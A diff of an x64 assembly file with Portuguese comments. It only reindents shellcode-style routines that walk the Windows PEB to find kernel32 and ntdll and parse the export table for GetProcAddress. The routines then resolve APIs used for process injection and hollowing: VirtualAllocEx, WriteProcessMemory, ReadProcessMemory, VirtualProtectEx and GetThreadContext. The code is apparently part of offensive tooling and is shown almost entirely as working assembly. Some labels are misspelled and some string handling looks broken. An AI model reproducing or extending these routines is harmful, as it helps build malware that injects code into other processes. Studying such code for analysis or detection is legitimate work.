@@ -1647,240 +1647,239 @@ ret
 
 LoadLibraryA:
 	call Locate_kernel32
-   ;pega o endereco LoadLibraryA usando GetProcAddress
-    mov rcx, 0x41797261;  
-    push rcx;  
-    mov rcx, 0x7262694c64616f4c;  
-    push rcx;  
-    mov rdx, rsp
-    mov rcx, r8
-    sub rsp, 0x30
-    call r14
-    add rsp, 0x30
-    add rsp, 0x10 
-    mov rsi, rax
+	;pega o endereco LoadLibraryA usando GetProcAddress
+	mov rcx, 0x41797261;  
+	push rcx;  
+	mov rcx, 0x7262694c64616f4c;  
+	push rcx;  
+	mov rdx, rsp
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	add rsp, 0x10 
+	mov rsi, rax
 ret
 
 LoadMsvcrt:
-    ;Load msvcrt.dll
-    mov rax, "ll"
-    push rax
-    mov rax, "msvcrt.d"
-    push rax
-    mov rcx, rsp
-    sub rsp, 0x30
-    call rsi
-    mov r15,rax
-    add rsp, 0x30
-    add rsp, 0x10
+	;Load msvcrt.dll
+	mov rax, "ll"
+	push rax
+	mov rax, "msvcrt.d"
+	push rax
+	mov rcx, rsp
+	sub rsp, 0x30
+	call rsi
+	mov r15,rax
+	add rsp, 0x30
+	add rsp, 0x10
 ret      
 
 GetProcAddres:
-    xor r11,r11
-    xor r13,r13
-    xor rcx, rcx
-    mov rax, gs:[rcx + 0x60]
-    mov rax, [rax + 0x18]
-    mov rsi, [rax + 0x20]
-    lodsq                          
-    xchg rax, rsi
-    lodsq
-    mov rbx, [rax + 0x20] 
-    mov r8, rbx
-      
-    ;Código para chegar na tabela de endereco de exportacao
-    mov ebx, [rbx+0x3C]
-    add rbx, r8
-    mov r12, 0x88FFFFF;      
-    shr r12, 0x14; 
-    mov edx, [rbx+r12]
-    add rdx, r8
-    mov r10d, [rdx+0x14]
-    xor r11, r11 
-    mov r11d, [rdx+0x20]
-    add r11, r8
+	xor r11,r11
+	xor r13,r13
+	xor rcx, rcx
+	mov rax, gs:[rcx + 0x60]
+	mov rax, [rax + 0x18]
+	mov rsi, [rax + 0x20]
+	lodsq                          
+	xchg rax, rsi
+	lodsq
+	mov rbx, [rax + 0x20] 
+	mov r8, rbx
+	
+	;Código para chegar na tabela de endereco de exportacao
+	mov ebx, [rbx+0x3C]
+	add rbx, r8
+	mov r12, 0x88FFFFF;      
+	shr r12, 0x14; 
+	mov edx, [rbx+r12]
+	add rdx, r8
+	mov r10d, [rdx+0x14]
+	xor r11, r11 
+	mov r11d, [rdx+0x20]
+	add r11, r8
 
 FinFunctionGetProcAddress2:
-    mov rcx, r10
+	mov rcx, r10
     kernel32findfunction2:  
-        jecxz FunctionNameFound2
-        xor ebx,ebx
-        mov ebx, [r11+4+rcx*4]
-        add rbx, r8
-        dec rcx
-        mov rax, 0x41636f7250746547
-        cmp [rbx], rax
-        jnz kernel32findfunction2;  
-;Encontra o endereço da função de GetProcessAddress
-FunctionNameFound2:                 
-        ; We found our target
-        xor r11, r11; 
-        mov r11d, [rdx+0x24]
-        add r11, r8
-        ; Get the function ordinal from AddressOfNameOrdinals
-        inc rcx; 
-        mov r13w, [r11+rcx*2]
-        ; Get function address from AddressOfFunctions
-        xor r11, r11 
-        mov r11d, [rdx+0x1c]
-        add r11, r8
-        mov eax, [r11+4+r13*4]
-        add rax, r8
-        mov r14, rax
+		jecxz FunctionNameFound2
+		xor ebx,ebx
+		mov ebx, [r11+4+rcx*4]
+		add rbx, r8
+		dec rcx
+		mov rax, 0x41636f7250746547
+		cmp [rbx], rax
+		jnz kernel32findfunction2;  
+	;Encontra o endereço da função de GetProcessAddress
+	FunctionNameFound2:                 
+			; We found our target
+			xor r11, r11; 
+			mov r11d, [rdx+0x24]
+			add r11, r8
+			; Get the function ordinal from AddressOfNameOrdinals
+			inc rcx; 
+			mov r13w, [r11+rcx*2]
+			; Get function address from AddressOfFunctions
+			xor r11, r11 
+			mov r11d, [rdx+0x1c]
+			add r11, r8
+			mov eax, [r11+4+r13*4]
+			add rax, r8
+			mov r14, rax
 ret
 
-;locate_kernel32
+;locate_kernel32	
 Locate_kernel32: 
-    xor rcx, rcx                      
-    mov rax, gs:[rcx + 0x60]
-    mov rax, [rax + 0x18]
-    mov rsi, [rax + 0x20]
-    lodsq
-    xchg rax, rsi
-    lodsq
-    mov rbx, [rax + 0x20]
-    mov r8, rbx
+	xor rcx, rcx                      
+	mov rax, gs:[rcx + 0x60]
+	mov rax, [rax + 0x18]
+	mov rsi, [rax + 0x20]
+	lodsq
+	xchg rax, rsi
+	lodsq
+	mov rbx, [rax + 0x20]
+	mov r8, rbx
 ret
     
 IAT:
-    ;Código para chegar na tabela de endereco de exportacao
-    mov ebx, [rbx+0x3C]
-    add rbx, r8
-    mov r12, 0x88FFFFF      
-    shr r12, 0x14 
-    mov edx, [rbx+r12]
-    add rdx, r8
-    mov r10d, [rdx+0x14]
-    xor r11, r11
-    mov r11d, [rdx+0x20]
-    add r11, r8
+	;Código para chegar na tabela de endereco de exportacao
+	mov ebx, [rbx+0x3C]
+	add rbx, r8
+	mov r12, 0x88FFFFF      
+	shr r12, 0x14 
+	mov edx, [rbx+r12]
+	add rdx, r8
+	mov r10d, [rdx+0x14]
+	xor r11, r11
+	mov r11d, [rdx+0x20]
+	add r11, r8
 ret
 
 ;locate_ntdll
 Locate_ntdll:        
-    xor rcx, rcx                      
-    mov rax, gs:[rcx + 0x60]          
-    mov rax, [rax + 0x18]             
-    mov rsi, [rax + 0x30]   
-    mov rbx, [rsi +0x10]         
-    mov r8, rbx
+	xor rcx, rcx                      
+	mov rax, gs:[rcx + 0x60]          
+	mov rax, [rax + 0x18]             
+	mov rsi, [rax + 0x30]   
+	mov rbx, [rsi +0x10]         
+	mov r8, rbx
 ret
-
 
 LoadLibrary:
-    ;Lookup LoadLibrary
+	;Lookup LoadLibrary
 	call Locate_kernel32
-    mov rcx, 0x41797261;  
-    push rcx;  
-    mov rcx, 0x7262694c64616f4c;  
-    push rcx;  
-    mov rdx, rsp
-    mov rcx, r8
-    sub rsp, 0x30
-    call r14
-    add rsp, 0x30
-    add rsp, 0x10 
-    mov rsi, rax
+	mov rcx, 0x41797261;  
+	push rcx;  
+	mov rcx, 0x7262694c64616f4c;  
+	push rcx;  
+	mov rdx, rsp
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	add rsp, 0x10 
+	mov rsi, rax
 ret
 VirtualProect:
-    mov rcx, 0x746365746f72
-    push rcx
-    mov rcx, 0x506C617574726956
-    shr rcx, 0x40
-    push rcx
-    mov rdx, rsp
-    mov rcx, r8
-    sub rsp, 0x30
-    call r14
-    add rsp, 0x30
-    add rsp, 0x10
-    mov rsi, rax
+	mov rcx, 0x746365746f72
+	push rcx
+	mov rcx, 0x506C617574726956
+	shr rcx, 0x40
+	push rcx
+	mov rdx, rsp
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	add rsp, 0x10
+	mov rsi, rax
 ret
 
 VirtualProectEx:
-    sub rsp, 0x30
-    mov rax, "rotectEx"
-    push Rax
-    mov rax, "VirtualP"
-    push rax
-    mov [rsp+0x10], byte 0x00
-    mov rdx, rsp;                    
-    mov rcx, r8;                     
-    sub rsp, 0x30
-    call r14;                       
-    add rsp, 0x30;                   
-    add rsp, 0x10;                    
-    mov rsi, rax;                    
-    mov r12, rax
-    add rsp, 0x30
+	sub rsp, 0x30
+	mov rax, "rotectEx"
+	push Rax
+	mov rax, "VirtualP"
+	push rax
+	mov [rsp+0x10], byte 0x00
+	mov rdx, rsp;                    
+	mov rcx, r8;                     
+	sub rsp, 0x30
+	call r14;                       
+	add rsp, 0x30;                   
+	add rsp, 0x10;                    
+	mov rsi, rax;                    
+	mov r12, rax
+	add rsp, 0x30
 ret
 
 WriteProcess:
-    ;Lookup WriteProcessMemory
-    mov rax, "ry"
-    push rax
-    mov rax, "cessMemo"
-    push rax
-    mov rax, "WritePro"
-    push rax
-    lea rdx, [rsp]
-    mov rcx, r15
-    sub rsp, 0x30
-    call r14
-    mov r12, rax
-    add rsp, 0x30
-    add rsp, 0x18
+	;Lookup WriteProcessMemory
+	mov rax, "ry"
+	push rax
+	mov rax, "cessMemo"
+	push rax
+	mov rax, "WritePro"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, r15
+	sub rsp, 0x30
+	call r14
+	mov r12, rax
+	add rsp, 0x30
+	add rsp, 0x18
 ret
 
 VirtualAllocEx:
-    ;Lookup VirtualAllocEx
-    mov rax, "llocEx"
-    push rax
-    mov rax, "VirtualA"
-    push rax
-    lea rdx, [rsp]
-    mov rcx, r8
-    sub rsp, 0x30
-    call r14
-    add rsp, 0x30
-    add rsp, 0x10
-    mov r12, rax
+	;Lookup VirtualAllocEx
+	mov rax, "llocEx"
+	push rax
+	mov rax, "VirtualA"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	add rsp, 0x10
+	mov r12, rax
 ret
 
 ReadProcessMemory:
-    ;Lookup ReadProcessMemory
-    mov rax, "y"
-    push Rax
-    mov rax, "essMemor"
-    push Rax, 
-    mov rax, "ReadProc"
-    push rax
-    lea rdx, [rsp]
-    mov rcx, rbx
-    sub rsp, 0x30
-    call R14
-    add rsp, 0x30
-    add rsp, 0x10
-    add rsp, 0x08
-    mov r12, rax
+	;Lookup ReadProcessMemory
+	mov rax, "y"
+	push Rax
+	mov rax, "essMemor"
+	push Rax, 
+	mov rax, "ReadProc"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, rbx
+	sub rsp, 0x30
+	call R14
+	add rsp, 0x30
+	add rsp, 0x10
+	add rsp, 0x08
+	mov r12, rax
 ret
 
 GetThreadCx:
-    ;Lookup GetThreadContext
-    sub rsp, 0x30
-    mov rax, "dContext"
-    push Rax
-    mov rax, "GetThrea" 
-    push rax
-    mov [rsp+0x10], dword 0x00
-    lea rdx, [rsp]
-    mov rcx, r8
-    sub rsp, 0x30
-    call R14
-    add rsp,0x30
-    add rsp,0x10
-    add rsp, 0x30
-    mov r12, rax
+	;Lookup GetThreadContext
+	sub rsp, 0x30
+	mov rax, "dContext"
+	push Rax
+	mov rax, "GetThrea" 
+	push rax
+	mov [rsp+0x10], dword 0x00
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call R14
+	add rsp,0x30
+	add rsp,0x10
+	add rsp, 0x30
+	mov r12, rax
 ret
 
 WSAStartup:
@@ -1963,15 +1962,15 @@ ret
 
 ; Lookup memcpy
 memcpy:
-		xor rax,rax
-		mov rax, 'memcpy'
-		push rax
-		mov rdx, rsp
-		mov rcx, r8
-		sub rsp, 0x30
-		call r14
-		add rsp, 0x30
-		mov r12,rax
+	xor rax,rax
+	mov rax, 'memcpy'
+	push rax
+	mov rdx, rsp
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	mov r12,rax
 ret
 
 strcmp:
